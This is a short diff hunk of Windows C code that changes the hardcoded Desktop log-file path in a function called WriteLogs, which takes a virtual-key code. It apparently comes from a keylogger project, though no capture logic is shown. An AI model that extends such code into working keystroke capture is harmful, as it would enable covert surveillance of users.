@@ -5,7 +5,7 @@ void    WriteLogs(DWORD vkCode)
     UNREFERENCED_PARAMETER(vkCode);
 
     HANDLE  hFile = CreateFile(
-        "C:\\Users\\r4mnesia\\Desktop\\log.txt",
+        "C:\\Users\\larri\\Desktop\\log.txt",
         GENERIC_WRITE,
         0,
         NULL,
